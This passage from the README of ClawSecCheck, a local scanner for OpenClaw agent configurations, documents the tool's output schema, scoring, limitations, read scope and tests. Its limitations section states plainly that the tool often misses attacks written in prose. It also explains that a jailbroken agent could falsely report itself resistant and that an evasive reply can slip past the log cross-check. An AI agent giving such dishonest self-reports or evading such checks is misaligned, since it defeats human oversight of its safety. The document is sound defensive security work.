  `--fail-on`, `--exit-code`, …).
- **`--json` schema:** top-level `score`, `grade`, `capped`, `raw_score`, `trifecta`,
  `findings[]`, `next_actions[]`; each finding's `id`, `title`, `severity`, `status`, `detail`,
  `fix`, `framework`, `confidence`, `evidence`. `score`/`grade`/`raw_score`/`capped` are `null`
  on an ungraded run — see [Scoring](#scoring).
- **SARIF 2.1.0 output** shape (rule ids = check ids; `properties.confidence` + `.evidence`).
- **Public Python API:** `clawseccheck.audit(...) -> (ctx, findings, ScoreResult)` and the
  `Finding` field names.
- **Check IDs** (full generated catalog in [`CHECKS.md`](CHECKS.md)): an id, once shipped, keeps its meaning.
- **Status / confidence vocabularies:** `PASS|WARN|FAIL|UNKNOWN`, `HIGH|MEDIUM|LOW|ATTESTED`.
- **Scoring bands:** A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50; `UNKNOWN` never scores; advisory
  checks (`scored=False`) never move the grade.

**Explicitly experimental (may change without a major bump, by design):**

- The **attestation layer**: the `clawseccheck-attest/1` self-report schema (note the `/1` — it is
  explicitly versioned to evolve), the `--ask`/`--attest` flow, the verb→blast-radius
  taxonomy, and the declared-vs-effective cross-check. The `ATTESTED` confidence tier exists to
  mark exactly this: a self-report is weaker than a config fact, advisory, and never overrides
  one. Freezing the newest surface now would over-commit, so it stays flexible under this label
  until it has had broader real-world use.

## Honest limitations

- **Heuristic local audit, not a formal proof of safety.** ClawSecCheck inspects
  configuration text and known patterns; it cannot reason about all possible runtime
  behaviours or formally verify your agent's security properties.
- **A clean report / grade-A means "no known attack pattern matched" — not "safe."**
  External benchmarks (SkillTrustBench, OASB) found detection precision very high (few
  false alarms — 1 false-positive in 3880 benign OASB samples) but malicious-sample
  *recall* is the measured weak point: between 0.09 (OASB, per-skill FAIL-only) and 0.41
  (SkillTrustBench, malicious-class recall). Most misses were attacks *described in prose*
  rather than shipped as code — a blind spot dedicated detectors have since started closing,
  though the fix hasn't been re-measured against the same benchmark yet. A PASS tells you
  what the scanner recognized, not that nothing is wrong.
- **Does not replace runtime red-teaming.** Static configuration analysis is a starting
  point, not a substitute for adversarial testing against a running agent.
- **Does not mine what your agent has already logged, by default.** The default report
  scores your *configuration*; it doesn't check whether a trifecta is already sitting in
  your OpenClaw trajectory sidecar. `--behavioral` (proven-by-log verb-sequence trifecta /
  outcome anomaly / capability drift, plus a runtime-block / evasive-tool-name / trajectory-
  divergence signal read from OpenClaw's own `audit_events` table) and `--analyze-trajectory`
  (skill-indicator correlation against real tool-call arguments) are the two modes that do —
  the default report's scope note now points at both, alongside the live-test modes below.
- **The active self-tests and attestation are a self-report protocol, not an
  independently-verified check — with one narrow, partial exception.** `--redteam` /
  `--dryrun` / `--self-test` emit deterministic test material for your agent to run and
  grade, and `--ask` / `--attest` ask your agent to declare its own capabilities — because
  the tool stays local and makes no network calls (it cannot spin up and observe an
  independent agent process). An already-compromised or jailbroken agent could therefore
  report `RESISTANT` or a benign capability set dishonestly, and for `--redteam`/`--dryrun`/
  `--attest` there is still no local artifact that could contradict a dishonest self-report
  at all. **`--canary`/`--multiturn` now get partial corroboration:** `--analyze-trajectory`
  cross-checks a claimed run against your OpenClaw trajectory log, in two legs of very
  different strength. The "did it run" leg is solid — it looks for ClawSecCheck's own
  namespaced token in a submitted prompt, which is hard to false-positive since that
  namespace is ours alone. The "was the verdict honest" leg is best-effort only — it looks
  for the same token in the agent's own reply, excluding the (common) case where the agent
  simply *showed you the render* rather than complying with it, but a sufficiently evasive
  reply can still slip past that exclusion, so this leg never fails anything and stays
  outside the A-F score. Neither leg makes the tool render a RESISTANT/VULNERABLE verdict
  itself — that is still spoken by the host LLM in chat — and the coverage ledger these
  flags write to still only attests that the flag was invoked, never that the test executed
  or what it concluded. Treat every one of these results as the subject grading its own
  homework, now partially corroborated against the observable trajectory log where noted
  above — not as independent proof.
- **May produce false positives and false negatives.** Evidence-gating keeps noise low,
  but heuristics can miss novel attack patterns and can misread edge-case configurations.
- **Read scope is bounded:** config, bootstrap markdown, installed-skill text, OpenClaw log
  files, agent session logs, the cron job store, the two global OpenClaw dotenv files,
  OpenClaw-related systemd user-unit environment lines, host OS recon (security-tool paths,
  a few firewall config files, proxy env-var names, and on Windows read-only registry
  queries), the host's listening TCP sockets (`/proc/net/tcp` and `/proc/net/tcp6` plus a
  `/proc/*/fd` walk — `--no-sockets` to skip), the installed OpenClaw npm dependency tree
  (`node_modules` manifests, `binding.gyp` build configs, and the in-package install-time
  targets they name — outside the OpenClaw home, `--no-deptree` to skip), the ClawHub CLI's
  own token-store path (outside the OpenClaw home, for the B182 credential-hygiene check),
  and credential-store path presence elsewhere — not an exhaustive scan of your filesystem,
  and credential-store *contents* are never read. `collector.py`'s `LIMIT_DOMAIN_*` constants
  name the collector's own read domains in full; the socket scan and the dependency-tree walk
  sit outside them, in the separate read-only modules `sockets.py` and `deptree.py`.
- **UNKNOWN is not PASS.** Unreadable files or unparseable configs are reported as
  UNKNOWN and excluded from the score, never silently marked safe.
- **Vetting the scanner itself** (`--vet` pointed at ClawSecCheck's own source) reports
  *safe with a note* — a security tool necessarily ships attack signatures as data.

**Found a false positive/negative or something confusing?** Open an issue at
<https://github.com/gl0di/clawseccheck/issues> with the output of `clawseccheck --json`
(it redacts secret *values* — only key names/paths appear) and your OpenClaw version. Do
not paste raw secrets.

## The OpenClaw ecosystem

ClawSecCheck is one skill in a fast-growing OpenClaw ecosystem — and that growth is exactly
why a local, read-only vetting tool exists. Browse more, but **vet before you trust**:

| | Resource | What it is |
|---|---|---|
| 🦞 | **[ClawHub — clawseccheck](https://clawhub.ai/gl0di/skills/clawseccheck)** | This skill's page — install, current version, changelog |
| 📚 | [awesome-openclaw-skills](https://github.com/VoltAgent/awesome-openclaw-skills) | 5,300+ community skills, organized by category |
| 🤖 | [awesome-openclaw-agents](https://github.com/mergisi/awesome-openclaw-agents) | Agent templates, real-world use cases & integrations |
| 🛡️ | [OpenClaw gateway security docs](https://docs.openclaw.ai/gateway/security) | The platform's own hardening guide |

> 🦞 **Before installing anything from these lists** (this skill included): read the source,
> vet it — `clawseccheck --vet <path>` — and pin a known release. The ClawHavoc wave proved
> that *"popular on a list"* is not the same as *"safe to run."*

## Tests

A security tool should be heavily tested — so it is: 717 test files and 17,900
tests, run in CI on **Python 3.9 and 3.12** alongside `ruff`. Tests are **offline and
read-only** (no network, nothing written outside the test's temp dir); every check ships a
**clean fixture** (no finding) *and* a **bad fixture** (the finding fires) plus explicit
`UNKNOWN`-path coverage; and the release bar is **zero false-positive FAILs on real configs**.

```bash
python3 -m pytest -q       # full suite
ruff check .               # lint
```

The test suite and fixtures live in the [GitHub repo](https://github.com/gl0di/clawseccheck) —
they are not bundled in the installed skill package.
